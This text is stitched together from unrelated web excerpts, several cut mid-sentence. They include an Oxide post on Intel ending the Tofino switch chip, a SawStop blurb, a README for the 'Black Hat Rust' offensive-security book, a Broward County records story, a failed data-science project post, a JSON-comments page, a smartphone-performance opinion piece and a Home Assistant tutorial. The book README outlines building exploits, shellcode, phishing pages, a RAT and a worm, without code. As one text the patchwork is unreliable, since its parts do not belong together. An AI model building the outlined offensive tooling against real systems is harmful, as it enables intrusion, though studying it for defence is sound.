somewhat relieved to learn that Tofino hadn’t been killed outright — but all future development of the part had been cancelled.
We were on the cusp of
<a href="https://oxide-and-friends.transistor.fm/episodes/shipping-the-first-oxide-rack-your-questions-answered">shipping our first product</a>,
and the switch was working, so our own die was cast.  And we were reassured by the Tofino team, who (to their great credit!) assured us
that they would support us, even going to far as to draft a formal letter from Intel that we could share with our own customers expressing
Intel’s ongoing support of Tofino.</p>
<p>While the situation for Tofino was obviously dire, I also felt we had some stoppage time; could we get in front of Gelsinger to explain why
killing switching silicon in 2023 feels a lot like
walking away from the GPGPU in 2011?  No, as it turns out, we couldn’t.  (And nor, apparently, could anyone else who was buying the part.)
Everyone we dealt with at Intel agreed that the move
was short-sighted, but as with so many things Intel (that culture problem again!), they felt powerless to change it.</p>
<p>Tofino was clearly living on borrowed time, and we were disappointed (though frankly not that surprised) when we were notified earlier this year
that Tofino was being formally killed.  It’s a credit to the Tofino team (or what was left of it at that point) that they continued to be very direct with us;
this was (clearly) a decision that they disagreed with, and they were especially apologetic for the sloppy manner in which the end-of-life
was being handled (which made a mockery of Intel’s own process for end-of-life management).</p>
<p>In the end, for all of the decisions that we made at Oxide — out of all of the companies and parts that we bet on, out of all the
partners that we had sent
<a href="https://rfd.shared.oxide.computer/rfd/68">RFD 68 Partnership as Shared Values</a> to — only one had walked away from us, and it was
the largest and best capitalized partner, who had repeatedly told us that they would not do exactly what they in fact did.
How can Intel ever expected to be trusted when they treat partners this way?</p>
<p>For Oxide, fortunately, Intel might have done us a favor in the limit.  While we were grateful to Tofino for allowing us to prove out our ideas on programmable networking,
we had issues with it too.  Specifically, Tofino’s software and instruction set architecture remained needlessly proprietary.  We believe
that switching silicon is awaiting its "x86 moment", when open source software can be implemented for a well-defined ISA — and we were never
going to get there with Tofino.
As we looked for our post-Tofino future, we were delighted to find the Xsight Labs team and their
<a href="https://www.businesswire.com/news/home/20241014894143/en/Xsight-Labs-Announces-X2-Programmable-SDN-Ethernet-Switches-for-Hyperscale-and-Edge-Data-Centers-Optimized-for-the-AI-Factory-Era">X2 ASIC</a>.  We are going to have a <strong>lot</strong> more to say about this part,
but suffice it to say that we see in X2 both the strengths that we saw in Tofino and <em>also</em> the potential to be
the open substrate for programmable networking writ large.  Stay tuned!</p>
<p>I have great reverence for Intel and its extraordinary history, and I would never count them out (the resurrection of a clinically-dead AMD shows
what is possible!), but I also won’t be integrating with any of their technology until their acute cultural issues are addressed.
With regard to these cultural issues (and his other strengths aside), Pat Gelsinger was indisputably wrong for Intel.</p>

Initially, Gass attempted to license the technology to major power tool companies, but none were interested. Now, opponents of the CPSC’s proposed law claim that implementing the technology would raise the price of table saws. Despite previous litigation against would-be imitators of their safety brake, SawStop has committed to dedicating its original patent to the public when these new regulations go into effect.&nbsp;</p><p>With <a href="https://www.lumafield.com/products/neptune-industrial-x-ray-ct-scanner" data-wf-native-id-path="39fb4a5c-e361-51d9-5390-713a3183eaae">Neptune</a> and <a href="https://www.lumafield.com/products/voyager-ai-powered-cloud-analysis-software" data-wf-native-id-path="3c10a99d-3af3-5bf7-b22c-cb7aa4026707">Voyager</a>, we see how SawStop’s technology exemplifies the kind of precision engineering that can prevent serious injuries and even save lives.

<p dir="auto">While the <a href="https://doc.rust-lang.org/book/" rel="nofollow">Rust Book</a> does an excellent job teaching <strong>What is</strong> Rust, a book about <strong>Why</strong> and <strong>How</strong> to Rust was missing.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Summary</h2><a id="user-content-summary" aria-label="Permalink: Summary" href="#summary"></a></p>
<p dir="auto">Whether in movies or mainstream media, hackers are often romanticized: they are painted as black magic wizards, nasty criminals, or, in the worst cases, as thieves with a hood and a crowbar.
In reality, the spectrum of the profile of the attackers is extremely large, from the bored teenager exploring the internet to sovereign State's armies as well as the unhappy former employee.</p>
<p dir="auto">What are the motivations of the attackers? How can they break seemingly so easily into any network? What do they do to their victims?
We will put on our black hat and explore the world of offensive security, whether it be cyber attacks, cybercrimes, or cyberwar.
Scanners, exploits, phishing toolkit, implants... From theory to practice, we will explore the arcane of offensive security and build our own offensive tools with the Rust programming language, Stack Overflow's most loved language for five years in a row.</p>
<p dir="auto">Which programming language allows to craft shellcodes, build servers, create phishing pages? Before Rust, none! Rust is the long-awaited one-size-fits-all programming language meeting all those requirements thanks to its unparalleled guarantees and feature set. Here is why.</p>

<p dir="auto">Free Updates and DRM Free, of course :)</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Who this book is for</h2><a id="user-content-who-this-book-is-for" aria-label="Permalink: Who this book is for" href="#who-this-book-is-for"></a></p>
<p dir="auto">This is NOT a 1000th tutorial about sqlmap and Metasploit, nor will it teach you the fundamentals of programming.</p>
<p dir="auto">Instead, it's a from-theory-to-practice guide and you may enjoy it if any of the following:</p>
<ul dir="auto">
<li>You keep screaming "show me the code!" when reading about cyber attacks and malwares</li>
<li>You are a developer and want to learn security</li>
<li>You are a security engineer and want to learn Rust programming</li>
<li>You want to learn real-world and idiomatic rust practices</li>
<li>You believe that the best defense is thinking like an attacker</li>
<li>You learn by building and love to look under the hood</li>
<li>You value simplicity and pragmatism</li>
<li>You develop your own tools and exploits with Python, Ruby, C, Java...</li>
<li>You want to learn real-world offensive security, not just pentesting</li>
<li>You want to start making money with bug bounty programs</li>
<li>You prefer getting things done over analysis paralysis</li>
</ul>
<p dir="auto">But I repeat, this book is NOT a computer science book.</p>

<p dir="auto">How to perform effective reconnaissance? In this chapter, we will build a multi-threaded scanner in order to automate the mapping of the target.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/3" rel="nofollow">3 - Going full speed with async</a></h4><a id="user-content-3---going-full-speed-with-async" aria-label="Permalink: 3 - Going full speed with async" href="#3---going-full-speed-with-async"></a></p>
<p dir="auto">Unfortunately, when a program spends most of its time in I/O operations, multi-threading is not a panacea. We will learn how async makes Rust code really, really fast and refactor our scanner to async code.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/4" rel="nofollow">4 - Adding modules with Trait objects</a></h4><a id="user-content-4---adding-modules-with-trait-objects" aria-label="Permalink: 4 - Adding modules with Trait objects" href="#4---adding-modules-with-trait-objects"></a></p>
<p dir="auto">We will add more heterogeneous modules to our scanner and will learn how Rust's type system helps create properly designed large software projects.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/5" rel="nofollow">5 - Crawling the web for OSINT</a></h4><a id="user-content-5---crawling-the-web-for-osint" aria-label="Permalink: 5 - Crawling the web for OSINT" href="#5---crawling-the-web-for-osint"></a></p>
<p dir="auto">Leveraging all we learned previously, we will build an extremely fast web crawler to help us find the needles in the haystack the web is.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Part II: Exploitation</h3><a id="user-content-part-ii-exploitation" aria-label="Permalink: Part II: Exploitation" href="#part-ii-exploitation"></a></p>

<p dir="auto">Once the external reconnaissance performed, it's time to find entry points. In this chapter we will learn how automated fuzzing can help us to find vulnerabilities that can be exploited to then gain access to our target's systems.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/7" rel="nofollow">7 - Exploit development</a></h4><a id="user-content-7---exploit-development" aria-label="Permalink: 7 - Exploit development" href="#7---exploit-development"></a></p>
<p dir="auto">Rust may not be as fast as python when it comes to iterating on quick scripts such as exploits, but as we will see, its powerful type and modules system make it nonetheless a weapon of choice.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/8" rel="nofollow">8 - Writing shellcodes in Rust</a></h4><a id="user-content-8---writing-shellcodes-in-rust" aria-label="Permalink: 8 - Writing shellcodes in Rust" href="#8---writing-shellcodes-in-rust"></a></p>
<p dir="auto">Shellcode development is an ungrateful task. Writing assembly by hand is definitely not sexy. Fortunately for us, Rust, one more time, got our back! In this chapter we will learn how to write shellcodes in plain Rust with no_std.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/9" rel="nofollow">9 - Phishing with WebAssembly</a></h4><a id="user-content-9---phishing-with-webassembly" aria-label="Permalink: 9 - Phishing with WebAssembly" href="#9---phishing-with-webassembly"></a></p>
<p dir="auto">When they can't find exploitable hardware or software vulnerability, attackers usually fall back to what is often the weakest link in the chain: Humans.
Again, Rust comes handy and will let us create advanced phishing pages by compiling to WebAssembly.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Part III: Implant development</h3><a id="user-content-part-iii-implant-development" aria-label="Permalink: Part III: Implant development" href="#part-iii-implant-development"></a></p>

<p dir="auto">A RAT (for Remote Access Tool), also known as implant or beacon, is a kind of software used to perform offensive operations on a target's machines. In this chapter we will build our own RAT communicating to a remote server and database.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/11" rel="nofollow">11 - Securing communications with end-to-end encryption</a></h4><a id="user-content-11---securing-communications-with-end-to-end-encryption" aria-label="Permalink: 11 - Securing communications with end-to-end encryption" href="#11---securing-communications-with-end-to-end-encryption"></a></p>
<p dir="auto">The consequences of our own infrastructure being compromised or seized can be disastrous. We will add end-to-end encryption to our RAT's communication in order to secure its communications and avoid leaving traces on our servers.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/12" rel="nofollow">12 - Going multi-platforms</a></h4><a id="user-content-12---going-multi-platforms" aria-label="Permalink: 12 - Going multi-platforms" href="#12---going-multi-platforms"></a></p>
<p dir="auto">Today's computing landscape is extremely fragmented. From Windows to macOS, we can't target only one Operating System to ensure the success of our operations. In this section we will see how Rust's ecosystem is extremely useful when it comes to cross-compilation.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/13" rel="nofollow">13 - Turning into a worm to increase reach</a></h4><a id="user-content-13---turning-into-a-worm-to-increase-reach" aria-label="Permalink: 13 - Turning into a worm to increase reach" href="#13---turning-into-a-worm-to-increase-reach"></a></p>
<p dir="auto">Once the initial targets compromised, we will capitalize on Rust's excellent reusability to incorporate some parts of our initial scanner to turn our RAT into a worm and reach more targets only accessible from the target's internal network.</p>

More than 30 years later, though, a routine audit of documents found hundreds of those arrests and convictions are still on the books and part of people’s criminal records.</p><p>On Friday, the State Attorney for Broward County Harold Pryor announced his office planned to do something about that, declaring, “it is never too late to do the right thing.”</p><p>“These records may be a dim memory or an unfortunate part of history to many, but they have had a long-lasting and severe impact on the lives of the people who were arrested – as well as their families and the wider community,” Pryor added.</p><p>The State Attorney’s Office explained that despite the Supreme Court’s decision, many of the cases were never vacated. That means they could still weigh on the lives of those prosecuted under the unconstitutional program, affecting their ability to get a job, find a home, or appearing in criminal history checks.</p><p>Anyone who thinks they may be affected by the effort is asked to reach out to the State Attorney’s Office.

      <p>⭐ I spent &gt;1,600 days working on a data science project that then failed because I lost interest. This article is to cope
with the failure and maybe help you (and me) to finish successful data science projects by summarising
a few learnings into a checklist, see <a href="#learnings">below</a>.</p>
<p>Nobody really likes to speak about failures. The same holds true for failed data science projects.
In this text, I document my most recent data science project which I worked on for 1,600 days -
days that I won’t get back despite the project failing.
Ultimately, it is important to communicate about failed projects similarly to successful projects
as those failed ones are the ones that help us to acquire scar tissue (<a href="https://youtu.be/I2ZK3ngNvvI?si=MkoLkVLl34ChHdW0&amp;t=111">thanks Andrej</a>) which makes us better data science
practitioners. And the latter is what we should all strive&nbsp;for!</p>

<h2><a href="#table-of-contents">The planned project <span>&amp;</span> its&nbsp;failure</a></h2>
<p>After completing <a href="https://lellep.xyz/blog/cycling-in-marburg-1-intro.html">a substantial hobby data analysis project</a> involving 1.5 million Nextbike
datapoints, I wanted to explore a different data modality: text. While my previous
work had focused on numerical analysis, I wanted to explore text as data source while delivering
some value. This opportunity presented itself in March 2020, just as <span>COVID</span>-19 began making
headlines. I discovered that Germany’s public news outlet, <a href="https://www.tagesschau.de/">Tagesschau</a>,
had launched a <span>COVID</span>-focused newsticker, aggregating everything from case numbers to policy changes
and breaking&nbsp;incidents.</p>
<p>The <span>COVID</span> newsticker provided both a compelling topic and an ideal text data
source. My plan was to scrape the entire newsticker over time and analyse it for both
metadata patterns, such as posting frequency, and deeper semantic insights about the people,
topics and countries involved. When <span>COVID</span> became less of an issue the Tagesschau shut down their
<span>COVID</span> newsticker in 2022-Q3 but launched a new one covering the emerging Ukraine-Russia war.
I seamlessly extended my project to collect also this new data&nbsp;stream.</p>
<p>I stopped working on the project in 2024-Q3 after 1,600 days of collecting data and some short data exploration
because life got busier, my priorities shifted and I had less free time at hand. Unfortunately, I never performed
any sort of serious data analyses except aforementioned short data exploration that I did after one week
into the project in&nbsp;2020-Q2.</p>
</div>
<div id="data-source-tagesschau-newsticker">
<h2><a href="#table-of-contents">Data source: Tagesschau&nbsp;newsticker</a></h2>
<p>The raw data format of the newsticker is shown in the figure below and explained in words below
the&nbsp;figure.</p>

</a></p><p>Raw format of newsticker data on Tagesschau website. Explanation see main&nbsp;text.</p>
</div>
<p>Every day featured a list of short news stories (shown in green),
each containing a timestamp, headline, body text and optional multimedia elements like Twitter/X
feeds, videos or audio clips. Each day normally linked back to the previous&nbsp;day.</p>
<p>I collected all the URLs and downloaded the underlying raw data from 2020-Q1 to 2024-Q3 for around
1,600 days while working towards my PhD and writing up my thesis. Then, I stopped because I lost
interest in the project and didn’t have time to continue it&nbsp;anymore.</p>
</div>
<div id="implementation-of-project-system-design">
<h2><a href="#table-of-contents">Implementation of project: System&nbsp;Design</a></h2>
<p>The system is a semi-automatic data pipeline which extracts raw data from the German news outlet Tagesschau
once a day and turns the raw unstructured data into structured news snippets that make up a dataset.
If I would have finished the project, this dataset would then have been released and used for
a number of analyses using&nbsp;Python.</p>
<p>The project system design is shown visually in the below figure and explained with words&nbsp;afterwards.</p>
<div>

</a></p><p>System design: Semi-automatic data pipeline for dataset curation that is used for&nbsp;analyses.</p>
</div>
<p>The data collection process involved a daily ritual of manually visiting the Tagesschau website to
capture links to both the <span>COVID</span> and later Ukraine war newstickers. While this manual approach constituted
the bulk of the project’s effort, it was necessitated by Tagesschau’s unstructured <span>URL</span> schema, which
made automated link collection&nbsp;impractical.</p>
<p>Every four to eight weeks, I would use Python to batch process these accumulated URLs, downloading the
underlying <span>HTML</span> pages as raw data. The emphasis on preserving raw <span>HTML</span> proved vital when Tagesschau
repeatedly altered their newsticker <span>DOM</span> structure throughout Q2 2020. This experience underscored a
fundamental data engineering principle: <strong>raw data is king</strong>. While parsers can be rewritten, lost data is&nbsp;irretrievable.</p>
<p>The technical pipeline itself was straightforward: Python scripts with BeautifulSoup4 parsed the
<span>HTML</span> pages into structured news items, which were then stored in an SQLite database. The end goal
was twofold: to share this unique dataset with the broader community and to conduct what I optimistically
labeled as “❤️ Cool Analyses” - though these analyses would ultimately remain&nbsp;unrealized.</p>
<p>Many parts of the project were on autopilot. That is except for two parts: (1) the manual
<span>ETL</span> pipeline part and (2) the actual analyses. While part (2) would have been the actual fun part, I spent
1,600 days doing (1) starting in ~2020-03 and ultimately abandonning the project in&nbsp;2024-Q3.</p>
</div>
<div id="my-learnings-for-me-and-others">
<h2><a href="#table-of-contents">My learnings for me and&nbsp;others</a></h2>
<p>In the future, I will use the following short checklist of advice to conduct successful (data science) projects.
The list is roughly ordered by decreasing&nbsp;relevance:</p>
<ol>
<li>Consider story telling from day one. While <a href="https://lellep.xyz/blog/cycling-in-marburg-1-intro.html">my Nextbike project</a>
had that built-in, this project would have been much more difficult to talk about because of the
negative topics of <span>COVID</span> and a&nbsp;war.</li>
<li>Get first analyses results out quickly based on a small dataset and don’t just collect data
up front to “analyse it later” - this is what I did here and it’s bad. Data postprocessing and
releasing some results as teasers are mostly important for you as after all, quick results keep
us motivated; e.g. for me, the present Tagesschau project was very interesting in the beginning
but I lost interest over time because of mindless data collecting. Ideally, given these first
results follow “<a href="https://austinkleon.com/show-your-work/">Show Your Work</a>” approach by making
the results public; this is super difficult for&nbsp;perfectionists.</li>
<li>Automate the h*ll out of your data science project (in particular the data acquisition part)
to reduce daily friction. If the automation process takes considerable work, then perceive it as a separate
topic to speak about online, again following the “<a href="https://austinkleon.com/show-your-work/">Show Your Work</a>” approach. For example,
the manual step in the process of my project could have been a beautiful and innovative machine
learning opportunity. Back then, I would have trained a specialised model (or used a pretrained specialised model)
but since LLMs made so much progress during the runtime of this project from 2020-Q1 to 2024-Q4, I would now
rather consider a foundational model wrapped as an <span>AI</span> agent instead; for example, I would try to find a
foundation model to do the job of for example finding the right link on the Tagesschau website, which was
by far the most draining part of the whole&nbsp;project.</li>
<li>Data cadence is relevant: Do you have to collect the data yourself over a period of time?
If yes, how often do you have to collect it - as in how often per hour for example? For the present
project, I had to scrape data only once per day, which is doable manually. For <a href="https://lellep.xyz/blog/cycling-in-marburg-1-intro.html">my previous NextBike project</a>,
however, I scraped data every 30 seconds. Since I scaped an <span>API</span>, the automation of that process was fairly&nbsp;simple.</li>
<li>Store raw data if possible. This allows you to condense it&nbsp;later.</li>
<li>Consider using the cloud for simplicity, reliability and last but certainly not least developing
real-life employability skills (<em>I am looking at you, University, that often fails to deliver the latter</em>).</li>
</ol>
</div>
<div id="conclusion">
<h2><a href="#table-of-contents">Conclusion</a></h2>
<p>Go out and build&nbsp;something!</p>
<p>A failed data science project is part of the learning experience and contributes
to your battle scar tissue; battle scar tissue through projects is a great concept from Andrej Karpathy
(see <a href="https://youtu.be/I2ZK3ngNvvI?si=MkoLkVLl34ChHdW0&amp;t=111">here</a> and <a href="https://stevengong.co/notes/Scar-Tissue">there</a>)
<span>&amp;</span> certainly makes us better data&nbsp;practitioners.</p>
<p>Personally, I would have loved to use the beautiful applied <span>ML</span> opportunity of identifying the right
newsticker link on the Tagesschau website using <span>NLP</span> to remove any manual labour but unfortunately, I don’t have
the time to do so. Also, I would have loved to evaluate the ~100,000 news
snippets that I collected and shared the dataset - but I will not; although I still think that these news analyses
would be super&nbsp;interesting!</p>
<p>Good news is that Tagesschau keeps releasing newstickers like for example for the <span>US</span> election 2024.
If you’re interested in picking up the project and getting some battle scars in, then please
drop me a message - I am happy to share the whole project with no strings attached&nbsp;:-).</p>

    <p>I know what you've been told. Douglas Crockford said that
      <a href="https://www.json.org/">JSON</a> can't have comments. And
      you accepted that. Understandable mistake; we've all been
      there.</p>

    <p>But I'm here to tell you there's another way,
      because <em>Douglas Crockford is not your dad</em>. You can put
      comments in JSON files <strong>if</strong> you know they're
      going to be read only by a reasonable parser. If you maintain a
      parser, you can make it accept comments and nothing bad will
      happen!</p>

    <h3>Reasonable Parsers</h3>
    <p>These ones will just do the right thing with no fuss:</p>

    <ul>
      <li><a href="http://dkolf.de/dkjson-lua/">dkjson</a> (Lua)</li>
      <li>TODO: list more</li>
    </ul>

    <h3>Not Completely Unreasonable Parsers</h3>
    <p>These ones can be configured to accept comments:</p>
    <ul>
      <li><a href="https://github.com/FasterXML/jackson">Jackson</a> (Java)</li>
    </ul>

    <h3>Unreasonable Parsers</h3>
    <p>These ones have not yet seen the light:</p>

I’m running last year’s Pixel 8 Pro — hardly a benchmark topper — as my daily driver, and just as silky smooth as the more powerful <a href="https://www.androidauthority.com/asus-rog-phone-9-pro-review-3496879/">ASUS ROG Phone 9 Pro</a> I’ve been using on the side. But even before that, I struggle to recall the last time an app jerked and juddered into life. Outside of a few niche use cases, smartphone power has been bountiful for a few years now, but to jump up another level, modern manufacturing is making it more and more expensive but with few real-world benefits. We might have already passed the point of diminishing returns, but we’re also paying more and more for the privilege.</p><p>This year’s <a href="https://www.androidauthority.com/snapdragon-8-elite-deep-dive-3491526/">Qualcomm Snapdragon 8 Elite</a> is a prime example; it offers significant leaps in benchmark performance but is said to be considerably more expensive than its predecessor. Likewise, MediaTek’s Dimensity 9400 commands a higher price tag too, yet you’ll struggle to tell a phone packing these chips apart from last year’s model when it’s in hand. Money thrown at higher benchmark scores could be spent on better cameras, newer battery tech, or anything else on your wishlist. Returning to the ROG, the baseline model has dropped the telephoto camera, no doubt to keep up with the spiraling costs of top-tier performance.</p><p>With reports that the next-gen <a href="https://www.androidauthority.com/snapdragon-8-elite-gen-2-price-specs-leak-3504545/">Snapdragon 8 Elite 2</a> will be “significantly” more expensive once again, something has to give; be it higher price tags or sacrificing other key specs. But is that a trade-off any of us are really willing to make?</p><div><h3>Are you willing to pay more for faster performance?</h3><p>2729 votes</p></div><p>I’m all for extra performance, of course, but there has to be an opportunity to use it. There’s no point in splashing out on a sports car to plod around the inner-city, after all. For smartphones, you don’t need the latest and greatest chip to sail through your daily apps or even <a href="https://www.androidauthority.com/snapdragon-8-elite-gaming-test-3499719/">hit 60fps in demanding Android games</a>. A further 20% or greater boost to peak smartphone performance feels academic at this point; it’s just not going to make one bit of difference to virtually every use case you could name. There’s more to high-end chips, of course, but you’d struggle to make the case that mainstream flagships are hinging their sales in niches like Wi-Fi 7 or barely finalized 5G technical releases, either.</p><p><q>A further 20% boost to peak performance feels academic at this point.</q></p><p>What these future high-end smartphones need is a compelling use case to leverage all this extra performance headroom. And no, I don’t think AI is the answer there. Consumers are lukewarm on it so far and today’s features run pretty well on modern and even slightly older hardware already.</p><p>Handheld gaming feels like an underutilized option — today’s flagships far outpace the beloved Nintendo Switch. But unless you’re willing to work around with Winlator or similar, you’re not playing modern AAA titles on your phone, while most classic emulators will run on a potato. Barring a major change in the fundamentals of Android/Linux and Arm gaming, future mobile GPUs are destined to remain underutilized.</p><p>That leaves the oft-promised but never truly realized pocket PC. I could certainly see myself using my handset for work if I could run a proper Linux desktop from my phone. Blowing up my docs and messaging apps on the big screen is already possible to an extent, but letting my phone’s processor rip at full tilt for image editing or managing my vast media library falls far short of a PC-like experience. With limitations like five concurrent apps and meager software options, <a href="https://www.androidauthority.com/samsung-dex-3156766/">Samsung Dex</a> — the clear market leader here — has never quite lived up to that potential. I’m keen to see if Samsung can level up Dex with the more powerful <a href="https://www.androidauthority.com/samsung-galaxy-s25-3437280/">Galaxy S25 series</a>, but we’ve not heard anything about it in the new One UI 7 beta, and Linux on Dex is long buried.</p><div><picture><source sizes="(min-width: 64rem) 51.25rem, 80vw" srcset="https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test.jpg.webp 1920w, https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test-1536w-864h.jpg.webp 1536w, https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test-675w-380h.jpg.webp 675w, https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test-64w-36h.jpg.webp 64w, https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test-1000w-563h.jpg.webp 1000w, https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test-300w-170h.jpg.webp 300w, https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test-1280w-720h.jpg.webp 1280w, https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test-840w-472h.jpg.webp 840w" type="image/webp"><img decoding="async" loading="lazy" sizes="(min-width: 64rem) 51.25rem, 80vw" title="Pixel 9 Benchmark Test" srcset="https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test.jpg 1920w, https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test-1536w-864h.jpg 1536w, https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test-675w-380h.jpg 675w, https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test-64w-36h.jpg 64w, https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test-1000w-563h.jpg 1000w, https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test-300w-170h.jpg 300w, https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test-1280w-720h.jpg 1280w, https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test-840w-472h.jpg 840w" alt="Pixel 9 Benchmark Test" src="https://www.androidauthority.com/wp-content/uploads/2024/08/Pixel-9-Benchmark-Test.jpg"></picture><div><p>Robert Triggs / Android Authority</p></div></div><p>Perhaps there’s hope that the <a href="https://www.androidauthority.com/chrome-os-becoming-android-3500661/">meshing of Android and ChromeOS</a> or the potential of <a href="https://www.androidauthority.com/android-linux-terminal-app-3489887/">running Debian apps on your phone</a> as soon as Android 16 could open the door to a broader range of software and use cases that could stretch tomorrow’s high-end chips. Certainly, the Snapdragon 8 Elite is more than powerful enough to serve as a high-end tablet or even a mid-tier work laptop, where photo editing or compiling code could really make use of those beefy CPU cores. Strangely enough, though, we haven’t seen flagship mobile silicon making its way over to Chromebooks, which remains a predominantly AMD and Intel affair. And that points to another hurdle: Linux software support for Arm processors is passable, but even proper desktop support wouldn’t mean we can finally run our Steam library on our smartphones. But it would be a significant step towards catching that all-important developer’s attention.</p><p><q>Extra performance comes at higher and higher costs.</q></p><p>Still, big performance really needs a big display to make use of it, so even more smartphones would also need to embrace DisplayPort over USB-C to make the pocketable PC a real thing. There are a lot of moving parts, then, which makes it seem unlikely we’ll be making the most of these powerhouse chipsets anytime soon. With that in mind, there’s little point in buying a phone for future-proof performance.</p><p>Instead, perhaps Qualcomm’s rumored <a href="https://www.androidauthority.com/snapdragon-8s-elite-gen-4-leak-3504625/">Snapdragon 8s Elite</a> and other upper-mid-range chips will be more than sufficient for everyday smartphone performance and better suit our readers’ preferences for longer battery life and <a href="https://www.androidauthority.com/best-2024-phones-arent-fast-3502060/">more affordable smartphones</a>. Better battery life and a lid on prices constantly poll as your two most desirable features of a modern smartphone, and the features over power idea certainly seems to work well enough for Google’s Pixel. Whether other flagship OEMs will see things the same way is probably much less likely, but Redmi/Xiaomi’s general manager was surveying fans earlier this year as to whether they wanted to keep following “upstream” costs or make phones more affordable. So, consumers aren’t the only ones pondering the cost/benefit ratio of modern hardware.</p><p><q>The ChromeOS merger and running Debian apps on Android hints at future powerhouse use cases, but we'll have to see.</q></p><p>The days of a new phone feeling notably snappier than your previous model have been long gone anyway, yet it seems odd to be turning my nose up at overkill performance that we could barely imagine a decade ago. But it’s the compromises, particularly in terms of squeezing product costs, that are presenting the industry with a tough choice. If there are compromises to be made, I’d much rather take the more expensive cameras, cutting-edge battery cells, a no-compromise approach to build quality, or just a freeze on prices over the extra performance I cannot realize.</p><p>Until a compelling new use case comes along that makes my current smartphone splutter, I’m increasingly convinced manufacturers should take their foot off the throttle a little and settle for more modest yearly gains. They could even start really focusing on other hugely important and popular aspects of a great smartphone, like <a href="https://www.androidauthority.com/battery-life-opinion-3502120/">better battery life</a>.</p></div></div>]]></description>

                    <p>I’ve been the happy owner of several Philips Hue-connected lights for a few years.
Some of them are coloured, some of them regular.
In addition, I bought a sensor to go along with the light I installed in my toilets:
it turns on automatically when it detects a movement there.</p>
<p>In this post, I want to document how I replaced the proprietary automation with Home Assistant’s.</p>
<p>This is the 3<sup>rd</sup> post in the My journey with Home Assistant focus series.Other posts include:</p>

<div>
<h2 id="the-current-philips-hue-automation">The current Philips Hue automation</h2>
<div>
<p>I mentioned the light and the sensor in the introduction.
To manage both directly or via Google Home, you <strong>need</strong> an additional component - the Hue Hub.
The Hub needs an Ethernet connection, but you can’t connect it to Wifi.</p>
<p>The next step is to register the device.
Installing the dedicated Philips Hue app on your phone or tablet is the first step.
Once installed, you can proceed to register the Hub itself.
You must then register the Hub itself.</p>
<p><span><img src="https://blog.frankel.ch/assets/resources/home-assistant/philips-hue-bridge.webp" alt="Hue Bridge on the app" width="354" height="767"></span></p>
<p>You must long push the button on top of the hub, probably for security reasons.
If everything goes well, as it did for me, you should see your devices on the app.</p>
<p><span><img src="https://blog.frankel.ch/assets/resources/home-assistant/philips-hue-lights.webp" alt="Hue Lights on the app" width="354" height="767"></span></p>
<p>The process goes the same for the motion sensor.
After registering it, you can configure it to turn on the light when it detects motion.
Even better, you can set the light’s intensity (and colour if it’s a coloured bulb) to adapt to the time of the day.
Indeed, it’s better to have a low-intensity reddish light at night to keep your <a href="https://en.wikipedia.org/wiki/Melatonin" target="_blank" rel="noopener">melatonin</a>.</p>
<p><span><img src="https://blog.frankel.ch/assets/resources/home-assistant/philips-hue-motion-sensor.webp" alt="Hue Motion Sensor on the app" width="354" height="767"></span></p>
</div>
</div>
<div>
<h2 id="migrating-to-home-assistant">Migrating to Home Assistant</h2>
<div>
<p>We will migrate step-by-step, as I did, to show you how straightforward and manageable it is.
The first mandatory step is to add the Philips Hue integration.</p>
<div>
<h3 id="integrating-philips-hue">Integrating Philips Hue</h3>
<p>Go to the left  menu, then select the <b>Devices &amp; services</b> item on the screen.
The opening window displays four tabs:
<em>Integrations</em>, <em>Devices</em>, <em>Entities</em>, and <em>Helpers</em>.
The default tab is <em>Integrations</em>:
click the <b>Add Integration</b> button at the bottom left corner.</p>
<p>Select , then configure the IP of the Hue Hub.
After Home Assistant has detected the latter, it will display it and all associated devices.</p>
<p>Note that you can add multiple hubs, even though one hub can manage (a bit more than) fifty connected devices.
At this point, Home Assistant should display every device added to your Hub.</p>
<p><span><img src="https://blog.frankel.ch/assets/resources/home-assistant/philips-hue-devices.webp" alt="Hue Devices in Home Assistant" width="840" height="600"></span></p>
<p>At this point, the devices appear in your default dashboard overview.
I’ll probably write about it in a later post.
Suffice it to say that the default dashboard overview automatically displays every device added.</p>
<p><span><img src="https://blog.frankel.ch/assets/resources/home-assistant/ha-ui-dashboard-overview.webp" alt="Home Assistant default dashboard overview" width="840" height="465"></span></p>
<p>We can now turn on the lights via Home Assistant’s UI.</p>
</div>
<div>
